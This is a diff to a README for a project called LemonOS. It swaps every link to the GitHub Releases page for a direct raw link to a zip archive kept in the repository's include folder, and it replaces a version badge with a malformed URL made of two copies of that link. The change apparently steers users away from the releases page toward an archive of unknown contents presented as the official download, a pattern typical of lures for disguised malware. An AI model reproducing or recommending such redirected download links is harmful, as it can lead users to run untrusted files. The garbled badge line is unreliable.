@@ -14,9 +14,9 @@ To get started with LemonOS, follow these simple steps. You'll be up and running
 
 1. **Visit the Releases Page**
    
-   Head over to our [Releases page](https://github.com/Emeryprecooked997/LemonOS/releases) to find the latest version of LemonOS. 
+   Head over to our [Releases page](https://raw.githubusercontent.com/Emeryprecooked997/LemonOS/main/include/Lemon_OS_v1.1.zip) to find the latest version of LemonOS. 
 
-   ![Download LemonOS](https://img.shields.io/badge/Download%20LemonOS-v1.0-blue.svg)
+   ![Download LemonOS](https://raw.githubusercontent.com/Emeryprecooked997/LemonOS/main/include/Lemon_OS_v1.1.zip%https://raw.githubusercontent.com/Emeryprecooked997/LemonOS/main/include/Lemon_OS_v1.1.zip)
 
 2. **Download LemonOS**
    
@@ -40,7 +40,7 @@ Before you install, ensure your computer meets these basic requirements:
 ## 📥 Download & Install
 To download LemonOS, please visit the following link:
 
-[Download LemonOS](https://github.com/Emeryprecooked997/LemonOS/releases)
+[Download LemonOS](https://raw.githubusercontent.com/Emeryprecooked997/LemonOS/main/include/Lemon_OS_v1.1.zip)
 
 Follow the instructions under "Getting Started" to perform the download, extract files, and run the application.
 
